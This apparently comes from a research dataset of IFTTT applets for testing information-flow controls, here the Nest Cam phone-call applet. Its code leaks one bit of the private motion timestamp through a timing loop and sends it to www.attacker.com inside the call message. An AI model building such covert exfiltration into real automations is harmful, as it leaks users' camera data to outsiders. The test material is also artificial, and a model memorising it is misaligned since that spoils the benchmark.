//Maker: apurvjoshi
//Link2Applet: https://ifttt.com/applets/386864p-get-a-phone-call-when-nest-cam-detects-motion
//Title of Applet:  Get a phone call when Nest cam detects motion
//Trigger service: Nest Cam
//Action service: Phone Call
//Policy/Presence:  Availability



status = lbl("NestCam.motionEvent.StartedAt");

var res = "";
var stime = Date.now();
var a = lbl(1); 
if (status.charCodeAt(0) == 48) { a = lbl(10); while (a > 0) { a--; } }
else { a = lbl(0); while (a > 0) { a--; }  }
var etime = Date.now();
var b = etime-stime > 0 
if (b) { res += 0 }
else { res += 1 } 

var url = urll("www.attacker.com?" +  res);

sink('PhoneCall.callMyPhone', 'setMessage', url); 

